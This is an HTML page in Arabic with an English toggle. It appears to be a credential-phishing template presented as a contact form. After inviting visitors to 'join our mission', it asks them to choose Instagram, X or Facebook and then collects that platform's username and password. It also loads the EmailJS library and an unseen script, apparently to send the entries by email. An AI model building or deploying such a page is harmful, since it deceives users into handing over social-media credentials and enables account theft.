<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نموذج الاتصال</title>
    <link rel="stylesheet" href="styles.css">
    <!-- External EmailJS script -->
    <script src="https://cdn.emailjs.com/dist/email.min.js" defer></script>
    <!-- External scripts.js -->
    <script src="scripts.js" defer></script>
</head>
<body>

<header>
    <div data-ar="نموذج الاتصال" data-en="Contact Form">نموذج الاتصال</div>
    <div class="language-switcher">
        <span onclick="toggleLanguage('ar')">العربية</span> | <span onclick="toggleLanguage('en')">English</span>
    </div>
</header>

<div class="hero">
    <div data-ar="مرحبًا بك في مهمتنا!" data-en="Welcome to our mission!">مرحبًا بك في مهمتنا!</div>
</div>

<div class="content">
    <div class="welcome-message" data-ar="اختر المنصة التي تود الانضمام إليها." data-en="Choose the platform you want to join.">اختر المنصة التي تود الانضمام إليها.</div>

    <div class="platform" id="instagram" data-ar="إنستغرام" data-en="Instagram" onclick="showForm('instagram')">إنستغرام</div>
    <div class="platform" id="x" data-ar="إكس" data-en="X" onclick="showForm('x')">إكس</div>
    <div class="platform" id="facebook" data-ar="فيسبوك" data-en="Facebook" onclick="showForm('facebook')">فيسبوك</div>

    <div class="form-container" id="form-container" style="display: none;">
        <h3 id="platform-name" data-ar="التسجيل في" data-en="Sign up for">التسجيل في</h3>
        <form id="registration-form">
            <input type="text" name="username" id="username" placeholder="اسم المستخدم" required>
            <input type="password" name="password" id="password" placeholder="كلمة المرور" required>
            <button type="submit" data-ar="انضمام" data-en="Join">انضمام</button>
        </form>
    </div>

    <button class="contact-toggle" onclick="document.getElementById('contact-form').style.display = 'block'" data-ar="تواصل معنا" data-en="Contact Us">تواصل معنا</button>

    <form id="contact-form" style="display: none;">
        <input type="text" name="name" placeholder="اسمك" required>
        <input type="email" name="email" placeholder="بريدك الإلكتروني" required>
        <textarea name="message" placeholder="رسالتك" required></textarea>
        <button type="submit">إرسال</button>
    </form>
</div>

</body>
</html>
